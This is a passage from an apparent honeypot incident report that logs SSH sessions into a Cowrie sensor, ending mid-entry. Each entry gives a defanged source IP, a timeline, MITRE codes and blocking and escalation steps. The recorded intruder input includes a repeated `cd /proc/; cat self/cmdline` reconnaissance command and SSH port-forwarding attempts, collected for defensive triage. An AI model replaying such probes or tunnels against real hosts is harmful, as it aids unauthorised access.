| `2026-07-10 13:43:09` | `cowrie.session.connect` |
| `2026-07-10 13:43:10` | `cowrie.client.version` |
| `2026-07-10 13:43:10` | `cowrie.client.kex` |
| `2026-07-10 13:43:12` | `cowrie.login.success` |
| `2026-07-10 13:43:13` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.118.49[.]18` to AbuseIPDB if not already reported
- [ ] Block `45.118.49[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214b7bfa32b8

| Field | Detail |
|---|---|
| **Source IP** | `176.36.139[.]231` |
| **First Seen** | 2026-07-10 13:43 |
| **Last Seen** | 2026-07-10 13:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:43:18` | `cowrie.session.connect` |
| `2026-07-10 13:43:18` | `cowrie.client.version` |
| `2026-07-10 13:43:18` | `cowrie.client.kex` |
| `2026-07-10 13:43:19` | `cowrie.login.success` |
| `2026-07-10 13:43:19` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.36.139[.]231` to AbuseIPDB if not already reported
- [ ] Block `176.36.139[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1030d2ba60a9

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:43 |
| **Last Seen** | 2026-07-10 13:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:43:19` | `cowrie.session.connect` |
| `2026-07-10 13:43:25` | `cowrie.login.success` |
| `2026-07-10 13:43:26` | `cowrie.session.params` |
| `2026-07-10 13:43:29` | `cowrie.command.input` |
| `2026-07-10 13:43:32` | `cowrie.log.closed` |
| `2026-07-10 13:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-625b3381421c

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:43 |
| **Last Seen** | 2026-07-10 13:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:43:32` | `cowrie.session.connect` |
| `2026-07-10 13:43:38` | `cowrie.login.success` |
| `2026-07-10 13:43:39` | `cowrie.session.params` |
| `2026-07-10 13:43:42` | `cowrie.command.input` |
| `2026-07-10 13:43:45` | `cowrie.log.closed` |
| `2026-07-10 13:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98a29b0a37b

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:43 |
| **Last Seen** | 2026-07-10 13:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:43:45` | `cowrie.session.connect` |
| `2026-07-10 13:43:50` | `cowrie.login.success` |
| `2026-07-10 13:43:51` | `cowrie.session.params` |
| `2026-07-10 13:43:54` | `cowrie.command.input` |
| `2026-07-10 13:43:57` | `cowrie.log.closed` |
| `2026-07-10 13:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b62f2a7edf76

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:43 |
| **Last Seen** | 2026-07-10 13:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:43:57` | `cowrie.session.connect` |
| `2026-07-10 13:44:03` | `cowrie.login.success` |
| `2026-07-10 13:44:04` | `cowrie.session.params` |
| `2026-07-10 13:44:07` | `cowrie.command.input` |
| `2026-07-10 13:44:10` | `cowrie.log.closed` |
| `2026-07-10 13:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b6371416da1

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:44 |
| **Last Seen** | 2026-07-10 13:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:44:10` | `cowrie.session.connect` |
| `2026-07-10 13:44:16` | `cowrie.login.success` |
| `2026-07-10 13:44:17` | `cowrie.session.params` |
| `2026-07-10 13:44:20` | `cowrie.command.input` |
| `2026-07-10 13:44:23` | `cowrie.log.closed` |
| `2026-07-10 13:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc17c42a491

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:44 |
| **Last Seen** | 2026-07-10 13:44 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:44:23` | `cowrie.session.connect` |
| `2026-07-10 13:44:29` | `cowrie.login.success` |
| `2026-07-10 13:44:30` | `cowrie.session.params` |
| `2026-07-10 13:44:33` | `cowrie.command.input` |
| `2026-07-10 13:44:36` | `cowrie.log.closed` |
| `2026-07-10 13:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4457754daf1a

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:44 |
| **Last Seen** | 2026-07-10 13:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:44:36` | `cowrie.session.connect` |
| `2026-07-10 13:44:41` | `cowrie.login.success` |
| `2026-07-10 13:44:42` | `cowrie.session.params` |
| `2026-07-10 13:44:46` | `cowrie.command.input` |
| `2026-07-10 13:44:49` | `cowrie.log.closed` |
| `2026-07-10 13:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff13a288f22d

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-07-10 13:44 |
| **Last Seen** | 2026-07-10 13:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:44:42` | `cowrie.session.connect` |
| `2026-07-10 13:44:43` | `cowrie.client.version` |
| `2026-07-10 13:44:43` | `cowrie.client.kex` |
| `2026-07-10 13:44:46` | `cowrie.login.success` |
| `2026-07-10 13:44:46` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f7f319b509e

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:44 |
| **Last Seen** | 2026-07-10 13:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:44:49` | `cowrie.session.connect` |
| `2026-07-10 13:44:55` | `cowrie.login.success` |
| `2026-07-10 13:44:56` | `cowrie.session.params` |
| `2026-07-10 13:44:58` | `cowrie.command.input` |
| `2026-07-10 13:45:02` | `cowrie.log.closed` |
| `2026-07-10 13:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba9a31ad6aeb

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-07-10 13:44 |
| **Last Seen** | 2026-07-10 13:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:44:52` | `cowrie.session.connect` |
| `2026-07-10 13:44:53` | `cowrie.client.version` |
| `2026-07-10 13:44:53` | `cowrie.client.kex` |
| `2026-07-10 13:44:56` | `cowrie.login.success` |
| `2026-07-10 13:44:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2978911b025

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:45 |
| **Last Seen** | 2026-07-10 13:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:45:02` | `cowrie.session.connect` |
| `2026-07-10 13:45:08` | `cowrie.login.success` |
| `2026-07-10 13:45:09` | `cowrie.session.params` |
| `2026-07-10 13:45:11` | `cowrie.command.input` |
| `2026-07-10 13:45:16` | `cowrie.log.closed` |
| `2026-07-10 13:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33327849478

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:45 |
| **Last Seen** | 2026-07-10 13:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:45:16` | `cowrie.session.connect` |
| `2026-07-10 13:45:20` | `cowrie.login.success` |
| `2026-07-10 13:45:21` | `cowrie.session.params` |
| `2026-07-10 13:45:22` | `cowrie.command.input` |
| `2026-07-10 13:45:29` | `cowrie.log.closed` |
| `2026-07-10 13:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f43d9159252

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:45 |
| **Last Seen** | 2026-07-10 13:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:45:29` | `cowrie.session.connect` |
| `2026-07-10 13:45:37` | `cowrie.login.success` |
| `2026-07-10 13:45:37` | `cowrie.session.params` |
| `2026-07-10 13:45:40` | `cowrie.command.input` |
| `2026-07-10 13:45:43` | `cowrie.log.closed` |
| `2026-07-10 13:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb953bf22cd2

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:45 |
| **Last Seen** | 2026-07-10 13:45 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:45:43` | `cowrie.session.connect` |
| `2026-07-10 13:45:51` | `cowrie.login.success` |
| `2026-07-10 13:45:51` | `cowrie.session.params` |
| `2026-07-10 13:45:54` | `cowrie.command.input` |
| `2026-07-10 13:45:57` | `cowrie.log.closed` |
| `2026-07-10 13:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeeaef65bdcc

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:45 |
| **Last Seen** | 2026-07-10 13:46 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:45:57` | `cowrie.session.connect` |
| `2026-07-10 13:46:05` | `cowrie.login.success` |
| `2026-07-10 13:46:06` | `cowrie.session.params` |
| `2026-07-10 13:46:09` | `cowrie.command.input` |
| `2026-07-10 13:46:12` | `cowrie.log.closed` |
| `2026-07-10 13:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e8db94e48f

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:46 |
| **Last Seen** | 2026-07-10 13:46 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:46:12` | `cowrie.session.connect` |
| `2026-07-10 13:46:21` | `cowrie.login.success` |
| `2026-07-10 13:46:21` | `cowrie.session.params` |
| `2026-07-10 13:46:25` | `cowrie.command.input` |
| `2026-07-10 13:46:26` | `cowrie.log.closed` |
| `2026-07-10 13:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dbd366b2c92

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:46 |
| **Last Seen** | 2026-07-10 13:46 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:46:26` | `cowrie.session.connect` |
| `2026-07-10 13:46:34` | `cowrie.login.success` |
| `2026-07-10 13:46:35` | `cowrie.session.params` |
| `2026-07-10 13:46:38` | `cowrie.command.input` |
| `2026-07-10 13:46:40` | `cowrie.log.closed` |
| `2026-07-10 13:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-209872d10ab1

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:46 |
| **Last Seen** | 2026-07-10 13:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:46:40` | `cowrie.session.connect` |
| `2026-07-10 13:46:48` | `cowrie.login.success` |
| `2026-07-10 13:46:49` | `cowrie.session.params` |
| `2026-07-10 13:46:50` | `cowrie.log.closed` |
| `2026-07-10 13:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f86d4c70d4b0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 13:47 |
| **Last Seen** | 2026-07-10 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:47:49` | `cowrie.session.connect` |
| `2026-07-10 13:47:49` | `cowrie.client.version` |
| `2026-07-10 13:47:49` | `cowrie.client.kex` |
| `2026-07-10 13:47:49` | `cowrie.login.success` |
| `2026-07-10 13:47:50` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:47:50` | `cowrie.direct-tcpip.data` |
| `2026-07-10 13:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6186397913

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 13:50 |
| **Last Seen** | 2026-07-10 13:51 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:50:39` | `cowrie.session.connect` |
| `2026-07-10 13:50:41` | `cowrie.client.version` |
| `2026-07-10 13:50:41` | `cowrie.client.kex` |
| `2026-07-10 13:50:52` | `cowrie.login.success` |
| `2026-07-10 13:50:57` | `cowrie.session.params` |
| `2026-07-10 13:50:57` | `cowrie.command.input` |
| `2026-07-10 13:51:00` | `cowrie.log.closed` |
| `2026-07-10 13:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e0bf33a37f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 13:56 |
| **Last Seen** | 2026-07-10 13:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:56:44` | `cowrie.session.connect` |
| `2026-07-10 13:56:44` | `cowrie.client.version` |
| `2026-07-10 13:56:45` | `cowrie.client.kex` |
| `2026-07-10 13:56:45` | `cowrie.login.success` |
| `2026-07-10 13:56:45` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:56:45` | `cowrie.direct-tcpip.data` |
| `2026-07-10 13:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7df03b81b17c

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-10 13:58 |
| **Last Seen** | 2026-07-10 13:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:58:36` | `cowrie.session.connect` |
| `2026-07-10 13:58:37` | `cowrie.client.version` |
| `2026-07-10 13:58:37` | `cowrie.client.kex` |
| `2026-07-10 13:58:38` | `cowrie.login.success` |
| `2026-07-10 13:58:38` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c66bcfeb57

| Field | Detail |
|---|---|
| **Source IP** | `139.59.154[.]49` |
| **First Seen** | 2026-07-10 14:01 |
| **Last Seen** | 2026-07-10 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:01:14` | `cowrie.session.connect` |
| `2026-07-10 14:01:14` | `cowrie.login.success` |
| `2026-07-10 14:01:15` | `cowrie.session.params` |
| `2026-07-10 14:01:15` | `cowrie.command.input` |
| `2026-07-10 14:01:15` | `cowrie.command.failed` |
| `2026-07-10 14:01:15` | `cowrie.command.input` |
| `2026-07-10 14:01:15` | `cowrie.command.failed` |
| `2026-07-10 14:01:15` | `cowrie.command.input` |
| `2026-07-10 14:01:15` | `cowrie.log.closed` |
| `2026-07-10 14:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.154[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.154[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f95e60ebf04

| Field | Detail |
|---|---|
| **Source IP** | `139.59.154[.]49` |
| **First Seen** | 2026-07-10 14:01 |
| **Last Seen** | 2026-07-10 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:01:15` | `cowrie.session.connect` |
| `2026-07-10 14:01:15` | `cowrie.login.success` |
| `2026-07-10 14:01:15` | `cowrie.session.params` |
| `2026-07-10 14:01:15` | `cowrie.command.input` |
| `2026-07-10 14:01:15` | `cowrie.command.failed` |
| `2026-07-10 14:01:15` | `cowrie.command.input` |
| `2026-07-10 14:01:15` | `cowrie.command.failed` |
| `2026-07-10 14:01:15` | `cowrie.command.input` |
| `2026-07-10 14:01:16` | `cowrie.log.closed` |
| `2026-07-10 14:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.154[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.154[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee20f28769f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.154[.]49` |
| **First Seen** | 2026-07-10 14:01 |
| **Last Seen** | 2026-07-10 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:01:16` | `cowrie.session.connect` |
| `2026-07-10 14:01:16` | `cowrie.login.success` |
| `2026-07-10 14:01:16` | `cowrie.session.params` |
| `2026-07-10 14:01:16` | `cowrie.command.input` |
| `2026-07-10 14:01:16` | `cowrie.command.failed` |
| `2026-07-10 14:01:16` | `cowrie.command.input` |
| `2026-07-10 14:01:16` | `cowrie.command.failed` |
| `2026-07-10 14:01:16` | `cowrie.command.input` |
| `2026-07-10 14:01:16` | `cowrie.log.closed` |
| `2026-07-10 14:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.154[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.154[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a439d50ef99

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 14:03 |
| **Last Seen** | 2026-07-10 14:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
